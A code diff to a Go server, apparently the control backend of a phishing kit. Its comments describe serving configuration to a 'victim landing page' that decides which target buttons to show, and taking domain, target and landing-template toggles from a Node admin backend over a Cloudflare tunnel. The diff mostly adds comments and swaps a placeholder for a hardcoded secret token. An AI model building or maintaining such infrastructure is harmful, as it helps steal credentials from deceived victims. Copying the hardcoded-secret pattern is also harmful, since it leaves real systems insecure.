@@ -25,10 +25,12 @@ var (
 	activeConfig *GlobalConfig
 	configMu     sync.RWMutex
 	configPath   = "config.json"
-	// This must match the PRISM_ROUTING_WEBHOOK_SECRET in your Node .env
-	adminToken = "YOUR_NEW_SHARED_SECRET"
+	
+	// This MUST match the PRISM_ROUTING_WEBHOOK_SECRET in your Node.js .env file.
+	adminToken = "a244a0c0f0210be8325ad0710df42872216a3acc460832a85086452792bc710c"
 )
 
+// initConfig loads the config from disk on startup, or creates a default one.
 func initConfig() {
 	configMu.Lock()
 	defer configMu.Unlock()
@@ -51,6 +53,7 @@ func initConfig() {
 	log.Printf("[⚙️] Configuration loaded: %d domains tracked.", len(activeConfig.Domains))
 }
 
+// saveConfigUnsafe writes the current memory state to disk.
 func saveConfigUnsafe() {
 	data, err := json.MarshalIndent(activeConfig, "", "  ")
 	if err != nil {
@@ -62,22 +65,23 @@ func saveConfigUnsafe() {
 	}
 }
 
+// IsTargetEnabled checks if a specific target is enabled for a given base domain.
 func IsTargetEnabled(baseDomain, targetKey string) bool {
 	configMu.RLock()
 	defer configMu.RUnlock()
 
 	if activeConfig == nil {
-		return true
+		return true // Fail open if config isn't loaded
 	}
 
 	state, exists := activeConfig.Domains[baseDomain]
 	if !exists {
-		return true
+		return true // If domain isn't in config, default to ENABLED
 	}
 
 	enabled, targetExists := state.Targets[targetKey]
 	if !targetExists {
-		return true
+		return true // If target isn't listed, default to ENABLED
 	}
 
 	return enabled
@@ -86,11 +90,12 @@ func IsTargetEnabled(baseDomain, targetKey string) bool {
 // ── API HANDLERS ──
 
 // handleGetConfig is called by the victim landing page (App.jsx) to know which buttons to render.
-// This still needs CORS if the React app is hosted on a different domain.
+// It returns a unified structure: an array of enabled targets for the victim app, 
+// AND boolean/string states for the admin dashboard.
 func handleGetConfig(w http.ResponseWriter, r *http.Request) {
 	_, baseDomain, _ := resolveHost(r.Host)
 
-	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Access-Control-Allow-Origin", "*") // Keep CORS here for the victim React app
 	w.Header().Set("Content-Type", "application/json")
 
 	configMu.RLock()
@@ -135,13 +140,14 @@ func handleGetConfig(w http.ResponseWriter, r *http.Request) {
 }
 
 // handleGetAllDomains returns all configured domains to the Node backend.
-// NO CORS: This is strictly server-to-server.
+// NO CORS: This is strictly server-to-server via the Cloudflare tunnel.
 func handleGetAllDomains(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
+	// Authenticate the Node backend
 	authHeader := r.Header.Get("X-Webhook-Secret")
 	if authHeader != adminToken {
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
@@ -180,7 +186,7 @@ func handleGetAllDomains(w http.ResponseWriter, r *http.Request) {
 }
 
 // handleWebhookUpdate is called by the Node backend to change the config.
-// NO CORS: This is strictly server-to-server.
+// NO CORS PREFLIGHT: This is strictly server-to-server.
 func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
@@ -229,11 +235,12 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 		state.Targets = make(map[string]bool)
 	}
 
+	// CRITICAL LOGIC: Separate whole-domain toggles from individual-target toggles.
 	if req.Target != "" {
-		// Enable or disable one target.
+		// Enable or disable ONE specific target.
 		state.Targets[req.Target] = req.Enabled
 	} else {
-		// Enable or disable the entire domain.
+		// Enable or disable the ENTIRE domain.
 		state.Enabled = req.Enabled
 	}
 
@@ -248,7 +255,8 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 	saveConfigUnsafe() // Persist to disk
 	configMu.Unlock()
 
-	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v", req.Domain, state.LandingTemplate, req.Target, state.Enabled)
+	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v", 
+		req.Domain, state.LandingTemplate, req.Target, state.Enabled)
 
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusOK)
